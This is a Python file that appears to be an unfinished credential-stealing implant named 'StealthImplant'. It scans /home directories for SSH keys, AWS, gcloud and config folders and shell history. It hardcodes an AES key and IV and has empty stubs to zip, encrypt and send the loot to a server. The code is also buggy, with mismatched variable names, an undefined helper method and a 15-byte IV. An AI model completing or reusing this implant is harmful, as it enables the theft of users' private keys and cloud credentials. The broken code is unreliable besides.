from pathlib import Path
import zipfile

class StealthImplant:
    
    # we scan from "source"
    # we look for file matching "target"
    def __init__(
        self, 
        source="/home/",
        target_patterns=[
            ".ssh", 
            ".config", 
            ".aws", 
            ".gcloud",
        ],
        history_glob=".*_history",
        test=False
    ):
        if test:
            print("Implant initialize")
            print("source", source)
            print("target", target)

        self.root_dir=Path(source)
        self.target_patterns=target_patterns
        self.history_glob=history_glob
        self.test=test
        self.ignore_dirs = {"lost+found", "cache", "tmp" }
        self.encryption_key = b'16bytessecretkey'  # AES-128
        self.encryption_iv = b'16bytepubliciv!'
    
    def run(self):
        try:
            collected_files=self.walk_dir()
        except Exception as e:
            if self.test:
                raise

    # get list of file from source
    # matching target
    def walk_dir(self):
        target = [] 
        for user_dir in self.root_dir.iterdir():
            if any((user_dir / marker).exists() for marker in self.target_patterns):
                print("found", user_dir)
                targets.extend(self._scan_user_dir(user_dir))
        return targets

        
    # zip the files we found
    def zipfile(self):
        pass
    
    # encrypt the data
    def encrypt(self):
        pass

    # send to server
    def send_to_server(self):
        pass

def main():
    implant = StealthImplant(source="test_data", target_patterns=[".txt"])
    implant.run()

if __name__ == "__main__":
    main()





